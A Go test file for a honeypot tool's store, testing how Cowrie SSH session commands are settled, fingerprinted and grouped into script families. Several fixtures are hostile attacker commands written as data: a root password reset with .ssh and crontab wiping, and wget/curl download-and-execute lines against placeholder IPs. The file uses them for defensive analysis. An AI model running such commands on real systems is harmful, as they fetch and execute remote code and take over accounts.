package store

import (
	"context"
	"database/sql"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/script"
)

func TestSettleOnlyAfterIdleAndResettleOnLateCommands(t *testing.T) {
	s := newTestStore(t, "settle.db")
	ctx := context.Background()
	now := time.Now().UTC()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", now.Add(-20*time.Minute))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, now.Add(-30*time.Minute), 100); err != nil || n != 0 {
		t.Fatalf("settled before idle: %d %v", n, err)
	}
	// idleBefore must also be past the recorder's updated_at (ingest-time
	// idleness), so settle as of the real clock after recording.
	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil || n != 1 {
		t.Fatalf("settle: %d %v", n, err)
	}
	var fp1 string
	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s1'`).Scan(&fp1)
	cowrieEvent(t, s, "s1", "cowrie:a", "command", "crontab -r", "", "", now.Add(-15*time.Minute))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if n, _ := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); n != 1 {
		t.Fatal("late command did not re-settle")
	}
	var fp2 string
	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s1'`).Scan(&fp2)
	if fp1 == "" || fp1 == fp2 {
		t.Fatalf("fingerprints %q %q", fp1, fp2)
	}
	if err := s.PruneOrphanScripts(ctx); err != nil {
		t.Fatal(err)
	}
	var scripts int
	s.db.QueryRow(`SELECT COUNT(*) FROM scripts`).Scan(&scripts)
	if scripts != 1 {
		t.Fatalf("stale script rows kept: %d", scripts)
	}
}

func TestFamiliesAndMaterialisedView(t *testing.T) {
	s := newTestStore(t, "families.db")
	ctx := context.Background()
	old := time.Now().UTC().Add(-time.Hour)
	base := `cd ~; chattr -ia .ssh; rm -rf .ssh && mkdir .ssh && chmod 700 .ssh && echo "root\n%s\n%s" | passwd && crontab -r`
	cowrieEvent(t, s, "s1", "cowrie:a", "command", strings.ReplaceAll(base, "%s", "Abc123xyz789"), "", "", old)
	cowrieEvent(t, s, "s2", "cowrie:b", "command", strings.ReplaceAll(base, "%s", "Qwe987rty654")+" && history -c", "", "", old)
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if _, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil {
		t.Fatal(err)
	}
	if n, err := s.AssignScriptFamilies(ctx, 500); err != nil || n != 2 {
		t.Fatalf("assigned %d %v", n, err)
	}
	if err := s.RebuildScriptFamilies(ctx, 3000); err != nil {
		t.Fatal(err)
	}
	var families, links int
	var variants string
	s.db.QueryRow(`SELECT COUNT(*), MAX(variants), MAX(links) FROM script_families`).Scan(&families, &variants, &links)
	if families != 1 || strings.Count(variants, `"fingerprint"`) != 2 || links != 1 {
		t.Fatalf("families=%d links=%d variants=%s", families, links, variants)
	}
}

func TestAssignScriptFamiliesHonoursCancellation(t *testing.T) {
	s := newTestStore(t, "families-cancel.db")
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := s.AssignScriptFamilies(ctx, 500); err == nil {
		t.Fatal("cancelled pass reported success")
	}
}

// Settled scripts follow event retention, representatives included. A
// representative whose own sessions are gone used to be kept while any member
// still had sessions, so its normalized text (attacker commands, possibly
// typed passwords) outlived retention_days for as long as the family kept
// recurring (store-pipeline audit M8). Its family is now dissolved: the
// representative goes in the same pass and the surviving members return to
// the family pass, which regroups them around a live representative.
func TestPruneDissolvesFamilyOfExpiredRepresentative(t *testing.T) {
	s := newTestStore(t, "prune-rep.db")
	ctx := context.Background()
	old := time.Now().UTC().Add(-time.Hour)
	base := `cd ~; chattr -ia .ssh; rm -rf .ssh && mkdir .ssh && chmod 700 .ssh && echo "root\n%s\n%s" | passwd && crontab -r`
	cowrieEvent(t, s, "s1", "cowrie:a", "command", strings.ReplaceAll(base, "%s", "Abc123xyz789"), "", "", old)
	cowrieEvent(t, s, "s2", "cowrie:b", "command", strings.ReplaceAll(base, "%s", "Qwe987rty654")+" && history -c", "", "", old)
	cowrieEvent(t, s, "s3", "cowrie:c", "command", strings.ReplaceAll(base, "%s", "Zxc555vbn111")+" && w", "", "", old)
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if _, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil {
		t.Fatal(err)
	}
	if _, err := s.AssignScriptFamilies(ctx, 500); err != nil {
		t.Fatal(err)
	}
	var rep string
	var members int
	if err := s.db.QueryRow(`SELECT fingerprint, (SELECT COUNT(*) FROM scripts m WHERE m.family=r.fingerprint) FROM scripts r WHERE family=fingerprint`).Scan(&rep, &members); err != nil || members != 3 {
		t.Fatalf("fixture: one family of 3, got rep %q members %d, %v", rep, members, err)
	}
	if _, err := s.db.Exec(`DELETE FROM session_scripts WHERE fingerprint=?`, rep); err != nil {
		t.Fatal(err)
	}
	count := func() int {
		var n int
		s.db.QueryRow(`SELECT COUNT(*) FROM scripts`).Scan(&n)
		return n
	}
	if err := s.PruneOrphanScripts(ctx); err != nil {
		t.Fatal(err)
	}
	var kept int
	s.db.QueryRow(`SELECT COUNT(*) FROM scripts WHERE fingerprint=?`, rep).Scan(&kept)
	if kept != 0 || count() != 2 {
		t.Fatalf("expired representative kept=%d, scripts=%d; want it gone and the two live members left", kept, count())
	}
	var unassigned int
	s.db.QueryRow(`SELECT COUNT(*) FROM scripts WHERE family=''`).Scan(&unassigned)
	if unassigned != 2 {
		t.Fatalf("members still filed under the dead representative: %d unassigned", unassigned)
	}
	// The family pass regroups them around a live representative.
	if _, err := s.AssignScriptFamilies(ctx, 500); err != nil {
		t.Fatal(err)
	}
	var newRep string
	if err := s.db.QueryRow(`SELECT fingerprint, (SELECT COUNT(*) FROM scripts m WHERE m.family=r.fingerprint) FROM scripts r WHERE family=fingerprint`).Scan(&newRep, &members); err != nil || members != 2 {
		t.Fatalf("regrouped: rep %q members %d, %v", newRep, members, err)
	}
	var live int
	s.db.QueryRow(`SELECT COUNT(*) FROM session_scripts WHERE fingerprint=?`, newRep).Scan(&live)
	if live == 0 {
		t.Fatal("new representative has no session")
	}
	if _, err := s.db.Exec(`DELETE FROM session_scripts`); err != nil {
		t.Fatal(err)
	}
	if err := s.PruneOrphanScripts(ctx); err != nil {
		t.Fatal(err)
	}
	if n := count(); n != 0 {
		t.Fatalf("orphans kept: %d", n)
	}
}

// An updated_at ahead of the settle clock (wall clock stepped back) must not
// leave the session pending forever.
func TestSettleClockBehindUpdatedAtDoesNotLoop(t *testing.T) {
	s := newTestStore(t, "settle-race.db")
	ctx := context.Background()
	now := time.Now().UTC()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", now.Add(-20*time.Minute))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if _, err := s.db.Exec(`UPDATE session_scripts SET updated_at=? WHERE session_id='s1'`, formatFixedUTC(now.Add(time.Hour))); err != nil {
		t.Fatal(err)
	}
	// idleBefore past the future updated_at, as a later clock would be.
	if n, err := s.SettleSessionScripts(ctx, now.Add(2*time.Hour), 100); err != nil || n != 1 {
		t.Fatalf("settle: %d %v", n, err)
	}
	var settledAt, updatedAt string
	s.db.QueryRow(`SELECT settled_at, updated_at FROM session_scripts WHERE session_id='s1'`).Scan(&settledAt, &updatedAt)
	if settledAt < updatedAt {
		t.Fatalf("settled_at %s behind updated_at %s: would re-settle every pass", settledAt, updatedAt)
	}
	if n, _ := s.SettleSessionScripts(ctx, now.Add(2*time.Hour), 100); n != 0 {
		t.Fatalf("settled session re-settled without new lines: %d", n)
	}
}

// No prefix rows: a session whose events are old but whose lines were only
// just recorded (history seed in 1000-event windows) is not yet settled.
func TestSettleWaitsForIngestIdle(t *testing.T) {
	s := newTestStore(t, "settle-ingest-idle.db")
	ctx := context.Background()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", time.Now().UTC().Add(-time.Hour))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC().Add(-10*time.Minute), 100); err != nil || n != 0 {
		t.Fatalf("settled a session still being ingested: %d %v", n, err)
	}
	var fp string
	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s1'`).Scan(&fp)
	if fp != "" {
		t.Fatalf("prefix fingerprint written: %q", fp)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil || n != 1 {
		t.Fatalf("settle after ingest idle: %d %v", n, err)
	}
}

// The event-time gate on its own: ingest has been idle for hours (updated_at
// old), but the session's last command is only 5 minutes old, so it is not
// settled against a 10-minute idle cut.
func TestSettleWaitsForEventIdle(t *testing.T) {
	s := newTestStore(t, "settle-event-idle.db")
	ctx := context.Background()
	now := time.Now().UTC()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", now.Add(-5*time.Minute))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if _, err := s.db.Exec(`UPDATE session_scripts SET updated_at=? WHERE session_id='s1'`, formatFixedUTC(now.Add(-2*time.Hour))); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, now.Add(-10*time.Minute), 100); err != nil || n != 0 {
		t.Fatalf("settled a session whose last command is not idle: %d %v", n, err)
	}
	if n, err := s.SettleSessionScripts(ctx, now, 100); err != nil || n != 1 {
		t.Fatalf("settle once event-idle: %d %v", n, err)
	}
}

// A line recorded between settle's read and its write (updated_at moves)
// makes the guarded UPDATE skip that session this pass: no fingerprint and no
// scripts row from the stale lines. The next pass settles the whole session.
func TestSettleSkipsSessionChangedBeforeWrite(t *testing.T) {
	s := newTestStore(t, "settle-guard.db")
	ctx := context.Background()
	now := time.Now().UTC()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", now.Add(-time.Hour))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	settleBeforeWrite = func() {
		cowrieEvent(t, s, "s1", "cowrie:a", "command", "crontab -r", "", "", now.Add(-50*time.Minute))
		if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { settleBeforeWrite = nil })
	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil || n != 0 {
		t.Fatalf("stale settle wrote: %d %v", n, err)
	}
	var fp string
	var scripts int
	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s1'`).Scan(&fp)
	s.db.QueryRow(`SELECT COUNT(*) FROM scripts`).Scan(&scripts)
	if fp != "" || scripts != 0 {
		t.Fatalf("fingerprint %q, %d scripts rows from the stale read", fp, scripts)
	}
	settleBeforeWrite = nil
	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil || n != 1 {
		t.Fatalf("next pass: %d %v", n, err)
	}
	var cmds int
	s.db.QueryRow(`SELECT command_count FROM scripts`).Scan(&cmds)
	if want := script.CommandCount(script.Split(script.Join([]string{script.EncodeLine(injector), script.EncodeLine("crontab -r")}))); cmds != want {
		t.Fatalf("settled %d commands, want the whole session's %d", cmds, want)
	}
}

const familyBase = `cd ~; chattr -ia .ssh; rm -rf .ssh && mkdir .ssh && chmod 700 .ssh && echo "root\nAbc123xyz789\nAbc123xyz789" | passwd && crontab -r`

// seedFamilyScripts settles one session per command script.
func seedFamilyScripts(t *testing.T, s *Store, cmds []string) {
	t.Helper()
	ctx := context.Background()
	old := time.Now().UTC().Add(-time.Hour)
	for i, c := range cmds {
		cowrieEvent(t, s, fmt.Sprintf("s%d", i), fmt.Sprintf("cowrie:%d", i), "command", c, "", "", old.Add(time.Duration(i)*time.Second))
	}
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil || n != len(cmds) {
		t.Fatalf("settle %d %v", n, err)
	}
}

func scriptFamilies(t *testing.T, s *Store) map[string]string {
	t.Helper()
	rows, err := s.db.Query(`SELECT fingerprint, family FROM scripts`)
	if err != nil {
		t.Fatal(err)
	}
	defer rows.Close()
	out := map[string]string{}
	for rows.Next() {
		var fp, fam string
		if err := rows.Scan(&fp, &fam); err != nil {
			t.Fatal(err)
		}
		out[fp] = fam
	}
	if err := rows.Err(); err != nil {
		t.Fatal(err)
	}
	return out
}

func TestFamilyPassBudgetResumesToSameFamilies(t *testing.T) {
	cmds := []string{
		familyBase,
		familyBase + " && history -c",
		familyBase + " && uname -a",
		"cd /tmp; wget http://198.51.100.9/a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh",
		"uname -a",
	}
	ctx := context.Background()
	full := newTestStore(t, "families-full.db")
	seedFamilyScripts(t, full, cmds)
	if n, err := full.AssignScriptFamilies(ctx, 500); err != nil || n != len(cmds) {
		t.Fatalf("unbounded pass: %d %v", n, err)
	}
	want := scriptFamilies(t, full)

	saved := familyPassBudget
	familyPassBudget = 0
	t.Cleanup(func() { familyPassBudget = saved })
	b := newTestStore(t, "families-budget.db")
	seedFamilyScripts(t, b, cmds)
	n, err := b.AssignScriptFamilies(ctx, 500)
	if err != nil || n < 1 || n >= len(cmds) {
		t.Fatalf("zero-budget pass must assign a strict, non-empty prefix: %d %v", n, err)
	}
	total := n
	for i := 0; i < len(cmds) && total < len(cmds); i++ {
		n, err := b.AssignScriptFamilies(ctx, 500)
		if err != nil {
			t.Fatal(err)
		}
		total += n
	}
	if total != len(cmds) {
		t.Fatalf("budgeted passes assigned %d of %d", total, len(cmds))
	}
	got := scriptFamilies(t, b)
	if len(got) != len(want) {
		t.Fatalf("got %v want %v", got, want)
	}
	for fp, fam := range want {
		if got[fp] != fam {
			t.Fatalf("family of %s: got %q want %q", fp, got[fp], fam)
		}
	}
	var enc string
	var tc int
	b.db.QueryRow(`SELECT normalized, token_count FROM scripts LIMIT 1`).Scan(&enc, &tc)
	if tc == 0 || tc != len(script.Tokens(enc)) {
		t.Fatalf("token_count %d, want %d", tc, len(script.Tokens(enc)))
	}
}

// A representative outside the length band is never loaded, while a control
// representative inside it is: the control shows the observation works, so
// an empty "loaded" list cannot pass just because nothing was observed.
func TestFamilyPassSkipsRepsOutsideLengthBand(t *testing.T) {
	s := newTestStore(t, "families-band.db")
	ctx := context.Background()
	short := "cd /tmp; wget http://198.51.100.9/a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh"
	long := familyBase + " && " + strings.Repeat("rm -rf /tmp/x && ", 20) + "history -c"
	control := "cd /var/run; curl -O http://198.51.100.8/bins.sh; sh bins.sh; history -c; echo ok"
	fp := func(cmd string) string { return script.Fingerprint(script.Join([]string{script.EncodeLine(cmd)})) }
	seedFamilyScripts(t, s, []string{long, control})
	if _, err := s.AssignScriptFamilies(ctx, 500); err != nil {
		t.Fatal(err)
	}
	fam := scriptFamilies(t, s)
	if fam[fp(long)] != fp(long) || fam[fp(control)] != fp(control) {
		t.Fatalf("precondition: long and control must be representatives: %v", fam)
	}
	tc := func(f string) int {
		var n int
		s.db.QueryRow(`SELECT token_count FROM scripts WHERE fingerprint=?`, f).Scan(&n)
		return n
	}

	cowrieEvent(t, s, "short", "cowrie:short", "command", short, "", "", time.Now().UTC().Add(-time.Hour))
	if _, err := s.RecordCampaignEvidence(ctx, 1000); err != nil {
		t.Fatal(err)
	}
	if _, err := s.SettleSessionScripts(ctx, time.Now().UTC(), 100); err != nil {
		t.Fatal(err)
	}
	if !script.InLengthBand(tc(fp(short)), tc(fp(control))) || script.InLengthBand(tc(fp(short)), tc(fp(long))) {
		t.Fatalf("precondition: token counts short %d, control %d (in band), long %d (outside)", tc(fp(short)), tc(fp(control)), tc(fp(long)))
	}
	var loaded []string
	familyRepLoaded = func(fp string) { loaded = append(loaded, fp) }
	t.Cleanup(func() { familyRepLoaded = nil })
	if n, err := s.AssignScriptFamilies(ctx, 500); err != nil || n != 1 {
		t.Fatalf("assign: %d %v", n, err)
	}
	if len(loaded) != 1 || loaded[0] != fp(control) {
		t.Fatalf("loaded %v, want only the in-band control %s", loaded, fp(control))
	}
}

// Families never chain through members: with A ~ B, B ~ C and A !~ C, B joins
// A's family and C must become its own representative. AssignScriptFamilies
// enforces this by adding only unassigned scripts as representatives; were B
// added too, C would join through it.
func TestFamilyPassDoesNotChainThroughMembers(t *testing.T) {
	s := newTestStore(t, "families-chain.db")
	ctx := context.Background()
	mk := func(y int) string { // the first y of 10 commands differ from A
		cmds := make([]string, 10)
		for i := range cmds {
			w := "x"
			if i < y {
				w = "y"
			}
			cmds[i] = fmt.Sprintf("mkdir %s%d", w, i)
		}
		return strings.Join(cmds, "; ")
	}
	a, b, c := mk(0), mk(2), mk(5)
	tok := func(cmd string) []string { return script.Tokens(script.Join([]string{script.EncodeLine(cmd)})) }
	ta, tb, tc := tok(a), tok(b), tok(c)
	if script.Distance(ta, tb) > script.FamilyThreshold || script.Distance(tb, tc) > script.FamilyThreshold || script.Distance(ta, tc) <= script.FamilyThreshold {
		t.Fatalf("precondition: A~B %.3f B~C %.3f A~C %.3f", script.Distance(ta, tb), script.Distance(tb, tc), script.Distance(ta, tc))
	}
	seedFamilyScripts(t, s, []string{a, b, c}) // first_seen order A, B, C: A is processed first
	if n, err := s.AssignScriptFamilies(ctx, 500); err != nil || n != 3 {
		t.Fatalf("assign: %d %v", n, err)
	}
	fp := func(cmd string) string { return script.Fingerprint(script.Join([]string{script.EncodeLine(cmd)})) }
	fam := scriptFamilies(t, s)
	if fam[fp(a)] != fp(a) || fam[fp(b)] != fp(a) {
		t.Fatalf("A and B must share A's family: %v", fam)
	}
	if fam[fp(c)] != fp(c) {
		t.Fatalf("C chained through member B: family %q, want its own %q", fam[fp(c)], fp(c))
	}
}

// nearestReps takes the representatives nearest in token count, breaking
// equal distances by fingerprint, only inside the length band, and returns
// them in fingerprint order for AssignFamily's tie rule.
func TestNearestRepsIsDeterministic(t *testing.T) {
	b := map[int][]string{100: {"a", "b"}, 99: {"c"}, 101: {"d"}, 120: {"e"}, 130: {"f"}}
	for _, tc := range []struct {
		k    int
		want string
	}{{3, "a,b,c"}, {4, "a,b,c,d"}, {10, "a,b,c,d,e"}, {1, "a"}} {
		if got := strings.Join(nearestReps(b, 100, tc.k), ","); got != tc.want {
			t.Errorf("k=%d: %s, want %s", tc.k, got, tc.want)
		}
	}
}

// A pending script is compared with at most familyNearestReps
// representatives however many sit in its length band: the representative
// set is attacker-driven and each comparison is an O(n*m) distance.
func TestFamilyPassBoundsRepresentativesPerScript(t *testing.T) {
	s := newTestStore(t, "families-nearest.db")
	ts := formatFixedUTC(time.Now())
	const reps = familyNearestReps + 44
	if err := s.WithTx(func(tx *sql.Tx) error {
		for i := 0; i <= reps; i++ {
			enc := script.Join([]string{script.EncodeLine(fmt.Sprintf("mkdir %s", strings.Repeat("q", i+1)))})
			fp, fam := script.Fingerprint(enc), ""
			if i < reps {
				fam = fp
			}
			if _, err := tx.Exec(`INSERT INTO scripts(fingerprint,normalized,display,command_count,distinctive,family,token_count,first_seen,last_seen) VALUES(?,?,'',1,1,?,?,?,?)`,
				fp, enc, fam, len(script.Tokens(enc)), ts, ts); err != nil {
				return err
			}
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	loaded := 0
	familyRepLoaded = func(string) { loaded++ }
	t.Cleanup(func() { familyRepLoaded = nil })
	if n, err := s.AssignScriptFamilies(context.Background(), 500); err != nil || n != 1 {
		t.Fatalf("assign: %d %v", n, err)
	}
	if loaded != familyNearestReps {
		t.Fatalf("loaded %d representatives for one script, want %d", loaded, familyNearestReps)
	}
}

// A normaliser version change deletes only the script-derived tables and key
// evidence, in more than one chunk when they are large, rewinds the recorder
// to 0 and stores the version; payload evidence and campaign identity are
// untouched. A matching version is a no-op.
func TestResetScriptsForVersion(t *testing.T) {
	s := newTestStore(t, "script-version.db")
	ctx := context.Background()
	ts := formatFixedUTC(time.Now())
	if err := s.WithTx(func(tx *sql.Tx) error {
		for i := 0; i < scriptResetChunk+1500; i++ {
			if _, err := tx.Exec(`INSERT INTO session_script_lines(session_id,event_id,line) VALUES(?,?,'id')`, fmt.Sprintf("s%d", i/300), i); err != nil {
				return err
			}
		}
		for _, q := range []string{
			`INSERT INTO session_scripts(session_id,actor_id,first_seen,last_seen,updated_at,fingerprint) VALUES('s0','cowrie:a','` + ts + `','` + ts + `','` + ts + `','fp')`,
			`INSERT INTO session_scripts(session_id,actor_id,first_seen,last_seen,updated_at) VALUES('s1','cowrie:a','` + ts + `','` + ts + `','` + ts + `')`,
			`INSERT INTO scripts(fingerprint,normalized,display,command_count,distinctive,first_seen,last_seen) VALUES('fp','n','d',1,1,'` + ts + `','` + ts + `')`,
			`INSERT INTO script_families(family,display,variants,sessions,actors,ips,command_count,distinctive,links,reason,first_seen,last_seen) VALUES('fp','d','[]',1,1,1,1,1,0,'r','` + ts + `','` + ts + `')`,
			`INSERT INTO campaign_evidence(kind,value,session_id,actor_id,first_seen,last_seen) VALUES('ssh_key','k','s0','cowrie:a','` + ts + `','` + ts + `')`,
			`INSERT INTO campaign_evidence(kind,value,session_id,actor_id,first_seen,last_seen) VALUES('payload','` + strings.Repeat("ab", 32) + `','s0','cowrie:a','` + ts + `','` + ts + `')`,
			`INSERT INTO campaign_ids(kind,value,campaign_id,seq) VALUES('ssh_key','k','c-1',1)`,
			`INSERT INTO campaign_aliases(old_id,new_id,created_at) VALUES('c-0','c-1','` + ts + `')`,
			`INSERT INTO campaigns(id,name,updated_at) VALUES('c-1','Keep','` + ts + `')`,
			`INSERT INTO campaign_edits(campaign_id,action,arg,created_at) VALUES('c-1','rename','Keep','` + ts + `')`,
			`INSERT INTO ingest_state(source,path,inode,offset,head_sig,updated_at) VALUES('campaign','evidence-v1',0,999,'','` + ts + `')`,
		} {
			if _, err := tx.Exec(q); err != nil {
				return err
			}
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	count := func(q string) int {
		var n int
		if err := s.db.QueryRow(q).Scan(&n); err != nil {
			t.Fatal(err)
		}
		return n
	}
	if reset, err := s.ResetScriptsForVersion(ctx, 7); err != nil || !reset {
		t.Fatalf("reset=%v err=%v", reset, err)
	}
	if n := count(`SELECT (SELECT COUNT(*) FROM session_script_lines)+(SELECT COUNT(*) FROM session_scripts)+(SELECT COUNT(*) FROM scripts)+(SELECT COUNT(*) FROM script_families)`); n != 0 {
		t.Fatalf("%d script-derived rows left", n)
	}
	if n := count(`SELECT (SELECT COUNT(*) FROM campaign_evidence)+(SELECT COUNT(*) FROM campaign_ids)+(SELECT COUNT(*) FROM campaign_aliases)+(SELECT COUNT(*) FROM campaigns)+(SELECT COUNT(*) FROM campaign_edits)`); n != 5 {
		t.Fatalf("identity/payload evidence rows = %d, want 5 untouched", n)
	}
	// Key extraction changes with the normaliser, so key evidence is
	// rebuilt by the replay (TestVersionResetRebuildsKeyEvidence).
	if n := count(`SELECT COUNT(*) FROM campaign_evidence WHERE kind='ssh_key'`); n != 0 {
		t.Fatalf("%d ssh_key evidence rows survived the reset", n)
	}
	if c := evidenceCursorValue(t, s); c != 0 {
		t.Fatalf("cursor %d, want 0", c)
	}
	if v := count(`SELECT offset FROM ingest_state WHERE source='script_version' AND path='normaliser'`); v != 7 {
		t.Fatalf("stored version %d", v)
	}
	// The settled session's old fingerprint is kept for the carry (the
	// unsettled one has none), and the regroup hold is set.
	if n := count(`SELECT COUNT(*) FROM script_version_carry WHERE session_id='s0' AND fingerprint='fp'`); n != 1 || count(`SELECT COUNT(*) FROM script_version_carry`) != 1 {
		t.Fatalf("carry map has %d rows for s0", n)
	}
	// The hold is the high-water mark only: its deadline starts when the
	// recorder catches up (ScriptRebuildHold), never at the reset.
	if n := count(`SELECT COUNT(*) FROM ingest_state WHERE source='script_version' AND path='hold_hwm'`); n != 1 ||
		count(`SELECT COUNT(*) FROM ingest_state WHERE source='script_version' AND path='hold_deadline'`) != 0 {
		t.Fatalf("hold rows: hwm %d", n)
	}
	if reset, err := s.ResetScriptsForVersion(ctx, 7); err != nil || reset {
		t.Fatalf("matching version: reset=%v err=%v", reset, err)
	}
}

// RebuildScriptFamilies runs on every regroup (every 10 min) and the family
// count is attacker-driven: each non-distinctive script is its own family. It
// used to DELETE the whole table and re-INSERT every row under writeMu
// (10,000 families held it 204-230 ms on x86, ~0.5-0.7 s on ARM;
// store-pipeline audit M3). It now writes only the rows whose content changed,
// so an unchanged regroup takes no write at all. A trigger-fed counter sees
// every row write regardless of which pooled connection makes it.
func TestRebuildScriptFamiliesWritesOnlyChangedRows(t *testing.T) {
	s := newTestStore(t, "families-diff.db")
	ctx := context.Background()
	stamp := "2026-09-20T10:00:00.000000000Z"
	const families = 40
	for i := range families {
		fp := fmt.Sprintf("%064x", i+1)
		if _, err := s.db.Exec(`INSERT INTO scripts(fingerprint,normalized,display,command_count,distinctive,first_seen,last_seen,family,family_distance)
VALUES(?,?,?,1,0,?,?,?,0)`, fp, "id", "id", stamp, stamp, fp); err != nil {
			t.Fatal(err)
		}
		if _, err := s.db.Exec(`INSERT INTO session_scripts(session_id,actor_id,src_ip,line_count,bytes,first_seen,last_seen,updated_at,settled_at,fingerprint)
VALUES(?,?,'198.51.100.7',1,2,?,?,?,?,?)`, fmt.Sprintf("s%d", i), fmt.Sprintf("cowrie:a%d", i), stamp, stamp, stamp, stamp, fp); err != nil {
			t.Fatal(err)
		}
	}
	for _, q := range []string{
		`CREATE TABLE fam_writes(op TEXT)`,
		`CREATE TRIGGER fam_w_i AFTER INSERT ON script_families BEGIN INSERT INTO fam_writes VALUES('insert'); END`,
		`CREATE TRIGGER fam_w_u AFTER UPDATE ON script_families BEGIN INSERT INTO fam_writes VALUES('update'); END`,
		`CREATE TRIGGER fam_w_d AFTER DELETE ON script_families BEGIN INSERT INTO fam_writes VALUES('delete'); END`,
	} {
		if _, err := s.db.Exec(q); err != nil {
			t.Fatal(err)
		}
	}
	writes := func() string {
		t.Helper()
		var out string
		if err := s.db.QueryRow(`SELECT COALESCE(group_concat(op||':'||n, ','),'') FROM (SELECT op, COUNT(*) n FROM fam_writes GROUP BY op ORDER BY op)`).Scan(&out); err != nil {
			t.Fatal(err)
		}
		if _, err := s.db.Exec(`DELETE FROM fam_writes`); err != nil {
			t.Fatal(err)
		}
		return out
	}
	snapshot := func() string {
		t.Helper()
		var out string
		if err := s.db.QueryRow(`SELECT COALESCE(group_concat(r, char(10)),'') FROM (SELECT family||'|'||display||'|'||variants||'|'||sessions||'|'||actors||'|'||ips||'|'||command_count||'|'||distinctive||'|'||links||'|'||reason||'|'||first_seen||'|'||last_seen r FROM script_families ORDER BY family)`).Scan(&out); err != nil {
			t.Fatal(err)
		}
		return out
	}
	// fromScratch is what the old full rewrite produced: the diffing rebuild
	// must always land on the same table, so empty it and rebuild.
	fromScratch := func() string {
		t.Helper()
		if _, err := s.db.Exec(`DELETE FROM script_families`); err != nil {
			t.Fatal(err)
		}
		if err := s.RebuildScriptFamilies(ctx, 3000); err != nil {
			t.Fatal(err)
		}
		return snapshot()
	}

	if err := s.RebuildScriptFamilies(ctx, 3000); err != nil {
		t.Fatal(err)
	}
	if got := writes(); got != fmt.Sprintf("insert:%d", families) {
		t.Fatalf("first rebuild writes = %q, want every family inserted", got)
	}
	if err := s.RebuildScriptFamilies(ctx, 3000); err != nil {
		t.Fatal(err)
	}
	if got := writes(); got != "" {
		t.Fatalf("unchanged rebuild writes = %q, want none", got)
	}
	// One family gains a session, one loses its only session, one is new.
	fp0, fp1 := fmt.Sprintf("%064x", 1), fmt.Sprintf("%064x", 2)
	fpNew := fmt.Sprintf("%064x", 1000)
	for _, q := range []string{
		`INSERT INTO session_scripts(session_id,actor_id,src_ip,line_count,bytes,first_seen,last_seen,updated_at,settled_at,fingerprint)
VALUES('s-extra','cowrie:z','198.51.100.8',1,2,'` + stamp + `','2026-09-21T10:00:00.000000000Z','` + stamp + `','` + stamp + `','` + fp0 + `')`,
		`DELETE FROM session_scripts WHERE fingerprint='` + fp1 + `'`,
		`INSERT INTO scripts(fingerprint,normalized,display,command_count,distinctive,first_seen,last_seen,family,family_distance) VALUES('` + fpNew + `','w','w',1,0,'` + stamp + `','` + stamp + `','` + fpNew + `',0)`,
		`INSERT INTO session_scripts(session_id,actor_id,src_ip,line_count,bytes,first_seen,last_seen,updated_at,settled_at,fingerprint)
VALUES('s-new','cowrie:y','198.51.100.9',1,2,'` + stamp + `','` + stamp + `','` + stamp + `','` + stamp + `','` + fpNew + `')`,
	} {
		if _, err := s.db.Exec(q); err != nil {
			t.Fatalf("%v\n%s", err, q)
		}
	}
	if err := s.RebuildScriptFamilies(ctx, 3000); err != nil {
		t.Fatal(err)
	}
	if got := writes(); got != "delete:1,insert:1,update:1" {
		t.Fatalf("changed rebuild writes = %q, want exactly the three changed families", got)
	}
	got := snapshot()
	if want := fromScratch(); got != want {
		t.Fatalf("diffed table differs from a full rebuild:\n got %s\nwant %s", got, want)
	}
}
